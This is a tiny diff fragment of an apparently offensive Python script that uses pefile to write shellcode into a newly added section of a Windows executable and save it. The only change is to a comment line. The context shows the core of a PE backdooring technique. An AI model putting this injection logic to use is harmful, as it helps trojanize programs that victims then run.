@@ -117,5 +117,5 @@ print ("[*] STEP 0x04 - Inject the Shellcode in the New Section")
 raw_offset = pe.sections[last_section].PointerToRawData
 pe.set_bytes_at_offset(raw_offset, shellcode)
 print ("\t[+] Shellcode wrote in the new section")
-####
+#######
 pe.write(exe_path)
